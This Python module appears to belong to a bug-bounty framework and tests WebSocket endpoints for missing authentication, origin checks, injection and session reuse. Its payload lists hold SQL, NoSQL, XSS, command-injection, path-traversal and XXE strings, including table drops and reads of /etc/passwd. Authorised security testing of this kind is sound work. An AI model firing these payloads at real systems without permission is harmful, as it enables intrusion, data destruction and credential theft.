"""
DORAKULA - WebSocket Security Tester Module
=============================================
Advanced WebSocket security testing for bug bounty.
Tests for authentication bypass, message fuzzing, cross-origin
policy, injection, and session hijacking on reconnect.

Author: DORAKULA Framework
"""

import asyncio
import json
import logging
import time
from typing import Any, Dict, List, Optional, Tuple

try:
    import websockets
    from websockets.exceptions import (
        ConnectionClosed,
        InvalidHandshake,
        InvalidURI,
    )
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

logger = logging.getLogger("dorakula.websocket_tester")


class WebSocketSecurityTester:
    """Tests WebSocket connections for security vulnerabilities.

    Covers unauthenticated access, message fuzzing, cross-origin
    policy bypass, injection attacks, and session hijacking on
    reconnect. Uses AI-assisted payload generation for intelligent
    fuzzing.
    """

    def __init__(self, ai_router: Optional[Any] = None, timeout: int = 15) -> None:
        """Initialize the WebSocketSecurityTester.

        Args:
            ai_router: AI router instance for enhanced analysis.
            timeout: WebSocket connection timeout in seconds.
        """
        self.ai_router = ai_router
        self.timeout = timeout
        if not WEBSOCKETS_AVAILABLE:
            logger.warning("websockets library not available. Install with: pip install websockets")
        logger.info("WebSocketSecurityTester initialized with timeout=%d", timeout)

    async def _ai_analyze(self, analysis: Dict[str, Any], context: str) -> Dict[str, Any]:
        """Use AI router for enhanced analysis.

        Args:
            analysis: Raw analysis results.
            context: Test type context string.

        Returns:
            AI-enhanced analysis dictionary.
        """
        if self.ai_router is None:
            analysis["ai_analysis"] = "AI router not configured"
            analysis["confidence"] = 0.5
            return analysis

        try:
            prompt = (
                f"Analyze this WebSocket security test result for '{context}'. "
                f"Determine if it is a true vulnerability. "
                f"Rate confidence 0.0-1.0. Results: {analysis}"
            )
            ai_result = await self.ai_router.analyze(prompt)
            analysis["ai_analysis"] = ai_result.get("summary", "")
            analysis["confidence"] = ai_result.get("confidence", 0.5)
        except (ConnectionError, TimeoutError, ValueError) as exc:
            logger.warning("AI analysis failed: %s", exc)
            analysis["ai_analysis"] = f"AI analysis error: {exc}"
            analysis["confidence"] = 0.5

        return analysis

    def _normalize_ws_url(self, ws_url: str) -> str:
        """Normalize WebSocket URL to proper format.

        Args:
            ws_url: WebSocket URL (ws:// or wss://).

        Returns:
            Normalized WebSocket URL string.
        """
        if ws_url.startswith("http://"):
            return "ws://" + ws_url[7:]
        elif ws_url.startswith("https://"):
            return "wss://" + ws_url[8:]
        elif not ws_url.startswith("ws://") and not ws_url.startswith("wss://"):
            return "wss://" + ws_url
        return ws_url

    async def test_unauth(self, ws_url: str) -> Dict[str, Any]:
        """Test for unauthenticated WebSocket access.

        Attempts to connect to the WebSocket without any authentication
        tokens or credentials to check if auth is enforced.

        Args:
            ws_url: WebSocket URL to test.

        Returns:
            Dictionary with unauthenticated access test results.
        """
        if not WEBSOCKETS_AVAILABLE:
            return {"error": "websockets library not installed", "vulnerable": False}

        url = self._normalize_ws_url(ws_url)
        logger.info("Testing unauthenticated access on %s", url)

        try:
            # Attempt connection without auth
            connect_start = time.monotonic()
            async with websockets.connect(
                url,
                timeout=self.timeout,
            ) as ws:
                connect_time = time.monotonic() - connect_start

                # Try to receive a message (some servers send welcome)
                welcome_msg: Optional[str] = None
                try:
                    welcome_msg = await asyncio.wait_for(
                        ws.recv(), timeout=5
                    )
                except asyncio.TimeoutError:
                    pass

                # Try sending a basic message
                send_success = False
                try:
                    await ws.send('{"type":"ping"}')
                    send_success = True
                    # Try to receive response
                    try:
                        response = await asyncio.wait_for(
                            ws.recv(), timeout=5
                        )
                    except asyncio.TimeoutError:
                        response = None
                except ConnectionClosed:
                    response = None

            analysis = {
                "ws_url": url,
                "test_type": "unauthenticated_access",
                "connection_successful": True,
                "connect_time": round(connect_time, 3),
                "welcome_message": str(welcome_msg)[:500] if welcome_msg else None,
                "send_success": send_success,
                "vulnerable": True,  # Connection without auth succeeded
                "severity": "high",
                "description": "WebSocket accessible without authentication",
            }
            analysis = await self._ai_analyze(analysis, "ws_unauth")
            return analysis

        except InvalidHandshake as exc:
            logger.info("Unauth connection rejected: %s", exc)
            return {
                "ws_url": url,
                "connection_successful": False,
                "vulnerable": False,
                "reason": f"Handshake rejected: {exc}",
            }
        except (ConnectionRefusedError, ConnectionClosed) as exc:
            logger.info("Unauth connection failed: %s", exc)
            return {
                "ws_url": url,
                "connection_successful": False,
                "vulnerable": False,
                "reason": f"Connection failed: {exc}",
            }
        except (OSError, asyncio.TimeoutError) as exc:
            logger.error("Unauth test error: %s", exc)
            return {
                "ws_url": url,
                "error": str(exc),
                "vulnerable": False,
            }

    async def test_message_fuzz(self, ws_url: str) -> Dict[str, Any]:
        """Fuzz WebSocket messages with various payloads.

        Sends malformed and potentially exploitative messages to
        test for unexpected behavior, crashes, or information disclosure.

        Args:
            ws_url: WebSocket URL to fuzz.

        Returns:
            Dictionary with message fuzzing results.
        """
        if not WEBSOCKETS_AVAILABLE:
            return {"error": "websockets library not installed", "vulnerable": False}

        url = self._normalize_ws_url(ws_url)
        logger.info("Fuzzing WebSocket messages on %s", url)

        # Fuzz payloads
        fuzz_payloads: List[Dict[str, Any]] = [
            {"name": "empty_string", "payload": ""},
            {"name": "null_byte", "payload": "\x00"},
            {"name": "large_payload", "payload": "A" * 10000},
            {"name": "json_object", "payload": '{"type":"test","data":"fuzz"}'},
            {"name": "malformed_json", "payload": '{"type":"test","data":"fuzz"'},
            {"name": "sql_injection", "payload": '{"type":"query","data":"1 OR 1=1"}'},
            {"name": "xss_payload", "payload": '{"type":"message","data":"<script>alert(1)</script>"}'},
            {"name": "command_injection", "payload": '{"type":"cmd","data":"; ls -la"}'},
            {"name": "path_traversal", "payload": '{"type":"file","data":"../../../etc/passwd"}'},
            {"name": "prototype_pollution", "payload": '{"__proto__":{"polluted":"d0r4kul4"}}'},
            {"name": "nested_json", "payload": '{"a":{"b":{"c":{"d":"deep"}}}}'},
            {"name": "unicode_bomb", "payload": '{"data":"\\u0000\\uffff\\ud800"}'},
            {"name": "format_string", "payload": '{"data":"%s%s%s%s%s%n%n%n%n"}'},
            {"name": "xml_payload", "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'},
            {"name": "number_overflow", "payload": '{"id": 999999999999999999999999}'},
        ]

        results: List[Dict[str, Any]] = []

        try:
            async with websockets.connect(url, timeout=self.timeout) as ws:
                for fuzz in fuzz_payloads:
                    try:
                        await ws.send(fuzz["payload"])
                        try:
                            response = await asyncio.wait_for(
                                ws.recv(), timeout=3
                            )
                            results.append({
                                "name": fuzz["name"],
                                "payload_preview": fuzz["payload"][:100],
                                "response": str(response)[:500],
                                "response_received": True,
                                "error_indicators": self._check_error_indicators(
                                    str(response)
                                ),
                            })
                        except asyncio.TimeoutError:
                            results.append({
                                "name": fuzz["name"],
                                "payload_preview": fuzz["payload"][:100],
                                "response": None,
                                "response_received": False,
                                "error_indicators": False,
                            })
                    except ConnectionClosed as exc:
                        results.append({
                            "name": fuzz["name"],
                            "payload_preview": fuzz["payload"][:100],
                            "error": f"Connection closed: {exc}",
                            "response_received": False,
                            "connection_lost": True,
                        })
                        # Try to reconnect
                        try:
                            ws = await websockets.connect(url, timeout=self.timeout)
                        except (InvalidHandshake, OSError):
                            break
        except (InvalidHandshake, ConnectionRefusedError) as exc:
            return {
                "ws_url": url,
                "error": f"Failed to connect: {exc}",
                "vulnerable": False,
            }
        except OSError as exc:
            return {"ws_url": url, "error": str(exc), "vulnerable": False}

        error_responses = [r for r in results if r.get("error_indicators")]
        connection_losses = [r for r in results if r.get("connection_lost")]

        analysis = {
            "ws_url": url,
            "test_type": "message_fuzzing",
            "total_payloads": len(fuzz_payloads),
            "results": results,
            "error_responses": len(error_responses),
            "connection_losses": len(connection_losses),
            "vulnerable": len(error_responses) > 0 or len(connection_losses) > 0,
        }
        analysis = await self._ai_analyze(analysis, "ws_message_fuzz")
        return analysis

    async def test_cross_origin(self, ws_url: str) -> Dict[str, Any]:
        """Test WebSocket cross-origin policy.

        Attempts to connect from various Origin headers to determine
        if the WebSocket server validates the Origin header.

        Args:
            ws_url: WebSocket URL to test.

        Returns:
            Dictionary with cross-origin test results.
        """
        if not WEBSOCKETS_AVAILABLE:
            return {"error": "websockets library not installed", "vulnerable": False}

        url = self._normalize_ws_url(ws_url)
        logger.info("Testing cross-origin policy on %s", url)

        # Test origins
        test_origins: List[Dict[str, str]] = [
            {"origin": "https://evil.com", "description": "Malicious origin"},
            {"origin": "https://attacker.com", "description": "Attacker origin"},
            {"origin": "null", "description": "Null origin"},
            {"origin": "https://localhost", "description": "Localhost origin"},
            {"origin": "file://", "description": "File protocol origin"},
        ]

        results: List[Dict[str, Any]] = []

        for test_origin in test_origins:
            try:
                extra_headers = {"Origin": test_origin["origin"]}
                async with websockets.connect(
                    url,
                    timeout=self.timeout,
                    additional_headers=extra_headers,
                ) as ws:
                    # Connection succeeded with custom origin
                    try:
                        await ws.send('{"type":"ping"}')
                        response = await asyncio.wait_for(ws.recv(), timeout=3)
                        can_interact = True
                        response_preview = str(response)[:200]
                    except asyncio.TimeoutError:
                        can_interact = False
                        response_preview = None
                    except ConnectionClosed:
                        can_interact = False
                        response_preview = None

                    results.append({
                        "origin": test_origin["origin"],
                        "description": test_origin["description"],
                        "connection_accepted": True,
                        "can_interact": can_interact,
                        "response": response_preview,
                        "vulnerable": True,
                    })

            except InvalidHandshake:
                results.append({
                    "origin": test_origin["origin"],
                    "description": test_origin["description"],
                    "connection_accepted": False,
                    "vulnerable": False,
                })
            except (ConnectionRefusedError, ConnectionClosed, OSError) as exc:
                results.append({
                    "origin": test_origin["origin"],
                    "description": test_origin["description"],
                    "connection_accepted": False,
                    "error": str(exc),
                    "vulnerable": False,
                })

        accepted_origins = [r for r in results if r["connection_accepted"]]
        vulnerable_origins = [r for r in results if r.get("vulnerable")]

        analysis = {
            "ws_url": url,
            "test_type": "cross_origin",
            "total_origins_tested": len(test_origins),
            "accepted_origins": len(accepted_origins),
            "vulnerable_origins": vulnerable_origins,
            "results": results,
            "vulnerable": len(vulnerable_origins) > 0,
        }
        analysis = await self._ai_analyze(analysis, "ws_cross_origin")
        return analysis

    async def test_injection(self, ws_url: str) -> Dict[str, Any]:
        """Test for injection vulnerabilities in WebSocket messages.

        Sends various injection payloads through the WebSocket
        connection and analyzes responses for successful injection.

        Args:
            ws_url: WebSocket URL to test.

        Returns:
            Dictionary with injection test results.
        """
        if not WEBSOCKETS_AVAILABLE:
            return {"error": "websockets library not installed", "vulnerable": False}

        url = self._normalize_ws_url(ws_url)
        logger.info("Testing injection in WebSocket on %s", url)

        injection_payloads: List[Dict[str, Any]] = [
            {
                "category": "sql_injection",
                "payloads": [
                    '{"query":"SELECT * FROM users WHERE id=1 OR 1=1"}',
                    '{"id":"1 UNION SELECT username,password FROM users--"}',
                    '{"name":"admin\'--"}',
                    '{"data":"1; DROP TABLE users;--"}',
                ],
            },
            {
                "category": "nosql_injection",
                "payloads": [
                    '{"$gt":""}',
                    '{"username":{"$gt":""},"password":{"$gt":""}}',
                    '{"$where":"this.password.match(/.*/)!=null"}',
                    '{"$or":[{"username":"admin"},{"username":"root"}]}',
                ],
            },
            {
                "category": "xss",
                "payloads": [
                    '{"message":"<script>alert(document.cookie)</script>"}',
                    '{"message":"<img src=x onerror=alert(1)>"}',
                    '{"message":"javascript:alert(1)"}',
                    "{\"message\":\"{{constructor.constructor('return this')()}}\"}",
                ],
            },
            {
                "category": "command_injection",
                "payloads": [
                    '{"cmd":"; id"}',
                    '{"cmd":"| cat /etc/passwd"}',
                    '{"cmd":"$(whoami)"}',
                    '{"cmd":"`ls -la`"}',
                ],
            },
            {
                "category": "ldap_injection",
                "payloads": [
                    '{"username":"*)(|(cn=*))", "password":"x"}',
                    '{"query":"*)(&))"}',
                ],
            },
        ]

        results: List[Dict[str, Any]] = []

        try:
            async with websockets.connect(url, timeout=self.timeout) as ws:
                for category in injection_payloads:
                    category_results: List[Dict[str, Any]] = []

                    for payload in category["payloads"]:
                        try:
                            await ws.send(payload)
                            try:
                                response = await asyncio.wait_for(
                                    ws.recv(), timeout=3
                                )
                                response_str = str(response)
                                has_error = self._check_error_indicators(response_str)
                                has_data_leak = self._check_data_leak(response_str)

                                category_results.append({
                                    "payload": payload[:200],
                                    "response": response_str[:500],
                                    "error_indicators": has_error,
                                    "data_leak": has_data_leak,
                                    "potential_vulnerability": has_error or has_data_leak,
                                })
                            except asyncio.TimeoutError:
                                category_results.append({
                                    "payload": payload[:200],
                                    "response": None,
                                    "timeout": True,
                                    "potential_vulnerability": False,
                                })
                        except ConnectionClosed:
                            category_results.append({
                                "payload": payload[:200],
                                "connection_lost": True,
                                "potential_vulnerability": True,
                            })
                            # Reconnect
                            try:
                                ws = await websockets.connect(url, timeout=self.timeout)
                            except (InvalidHandshake, OSError):
                                break

                    results.append({
                        "category": category["category"],
                        "results": category_results,
                        "vulnerable_payloads": [
                            r for r in category_results if r.get("potential_vulnerability")
                        ],
                    })
        except (InvalidHandshake, ConnectionRefusedError) as exc:
            return {
                "ws_url": url,
                "error": f"Connection failed: {exc}",
                "vulnerable": False,
            }
        except OSError as exc:
            return {"ws_url": url, "error": str(exc), "vulnerable": False}

        vulnerable_categories = [
            r for r in results if len(r.get("vulnerable_payloads", [])) > 0
        ]

        analysis = {
            "ws_url": url,
            "test_type": "injection",
            "total_categories": len(results),
            "vulnerable_categories": vulnerable_categories,
            "results": results,
            "vulnerable": len(vulnerable_categories) > 0,
        }
        analysis = await self._ai_analyze(analysis, "ws_injection")
        return analysis

    async def test_reconnect_hijack(self, ws_url: str) -> Dict[str, Any]:
        """Test for session hijacking on WebSocket reconnect.

        Tests whether session tokens from a previous connection
        can be reused or if the reconnect mechanism is insecure.

        Args:
            ws_url: WebSocket URL to test.

        Returns:
            Dictionary with reconnect hijack test results.
        """
        if not WEBSOCKETS_AVAILABLE:
            return {"error": "websockets library not installed", "vulnerable": False}

        url = self._normalize_ws_url(ws_url)
        logger.info("Testing reconnect hijacking on %s", url)

        try:
            # Step 1: Establish first connection and capture session data
            session_data: Dict[str, Any] = {}
            initial_messages: List[str] = []

            try:
                async with websockets.connect(url, timeout=self.timeout) as ws1:
                    # Capture initial messages
                    try:
                        for _ in range(5):
                            msg = await asyncio.wait_for(ws1.recv(), timeout=3)
                            initial_messages.append(str(msg))
                    except asyncio.TimeoutError:
                        pass

                    # Capture response headers (via handshake)
                    session_data["initial_messages"] = initial_messages
                    session_data["connection_cookies"] = ws1.response_headers.get(
                        "set-cookie", ""
                    )
                    session_data["response_headers"] = dict(ws1.response_headers)
            except (InvalidHandshake, ConnectionRefusedError) as exc:
                return {
                    "ws_url": url,
                    "error": f"Initial connection failed: {exc}",
                    "vulnerable": False,
                }

            # Step 2: Attempt to reconnect with captured session data
            reconnect_results: List[Dict[str, Any]] = []

            # Test 1: Reconnect without any session tokens
            try:
                async with websockets.connect(url, timeout=self.timeout) as ws2:
                    reconnect_messages: List[str] = []
                    try:
                        for _ in range(5):
                            msg = await asyncio.wait_for(ws2.recv(), timeout=3)
                            reconnect_messages.append(str(msg))
                    except asyncio.TimeoutError:
                        pass

                    # Check if we get the same session
                    same_session = (
                        len(initial_messages) > 0
                        and initial_messages == reconnect_messages
                    )

                    reconnect_results.append({
                        "test": "reconnect_no_token",
                        "connection_successful": True,
                        "messages_match_initial": same_session,
                        "session_hijack_possible": same_session,
                    })
            except (InvalidHandshake, ConnectionRefusedError):
                reconnect_results.append({
                    "test": "reconnect_no_token",
                    "connection_successful": False,
                    "session_hijack_possible": False,
                })

            # Test 2: Reconnect with captured cookies
            if session_data["connection_cookies"]:
                try:
                    cookie_header = session_data["connection_cookies"]
                    async with websockets.connect(
                        url,
                        timeout=self.timeout,
                        additional_headers={"Cookie": cookie_header},
                    ) as ws3:
                        cookie_reconnect_messages: List[str] = []
                        try:
                            for _ in range(5):
                                msg = await asyncio.wait_for(ws3.recv(), timeout=3)
                                cookie_reconnect_messages.append(str(msg))
                        except asyncio.TimeoutError:
                            pass

                        same_session = (
                            len(initial_messages) > 0
                            and initial_messages == cookie_reconnect_messages
                        )

                        reconnect_results.append({
                            "test": "reconnect_with_cookie",
                            "connection_successful": True,
                            "messages_match_initial": same_session,
                            "session_hijack_possible": same_session,
                        })
                except (InvalidHandshake, ConnectionRefusedError):
                    reconnect_results.append({
                        "test": "reconnect_with_cookie",
                        "connection_successful": False,
                        "session_hijack_possible": False,
                    })

            # Test 3: Simultaneous connections
            simultaneous_hijack = False
            try:
                async with websockets.connect(url, timeout=self.timeout) as ws_a:
                    async with websockets.connect(url, timeout=self.timeout) as ws_b:
                        # Send from A, check if B receives it
                        await ws_a.send('{"type":"test","from":"connection_a"}')
                        try:
                            msg_b = await asyncio.wait_for(ws_b.recv(), timeout=3)
                            if "connection_a" in str(msg_b):
                                simultaneous_hijack = True
                        except asyncio.TimeoutError:
                            pass
            except (InvalidHandshake, ConnectionRefusedError, ConnectionClosed):
                pass

            hijack_possible = any(
                r.get("session_hijack_possible", False) for r in reconnect_results
            )

            analysis = {
                "ws_url": url,
                "test_type": "reconnect_hijack",
                "session_data": {
                    "has_cookies": bool(session_data.get("connection_cookies")),
                    "initial_message_count": len(initial_messages),
                },
                "reconnect_results": reconnect_results,
                "simultaneous_connection_cross_talk": simultaneous_hijack,
                "vulnerable": hijack_possible or simultaneous_hijack,
            }
            analysis = await self._ai_analyze(analysis, "ws_reconnect_hijack")
            return analysis

        except OSError as exc:
            logger.error("Reconnect hijack test failed: %s", exc)
            return {"ws_url": url, "error": str(exc), "vulnerable": False}

    @staticmethod
    def _check_error_indicators(response: str) -> bool:
        """Check response for error indicators.

        Args:
            response: Response string to check.

        Returns:
            True if error indicators are found.
        """
        error_keywords = [
            "error", "exception", "traceback", "stack trace",
            "undefined", "cannot read", "is not defined",
            "sql", "syntax error", "uncaught", "internal",
            "server error", "panic", "fatal",
        ]
        response_lower = response.lower()
        return any(kw in response_lower for kw in error_keywords)

    @staticmethod
    def _check_data_leak(response: str) -> bool:
        """Check response for data leak indicators.

        Args:
            response: Response string to check.

        Returns:
            True if data leak indicators are found.
        """
        leak_patterns = [
            "password", "token", "secret", "api_key",
            "session_id", "cookie", "auth", "credential",
            "root:", "uid=", "/bin/", "/etc/passwd",
            "aws_", "private_key",
        ]
        response_lower = response.lower()
        return any(pat in response_lower for pat in leak_patterns)
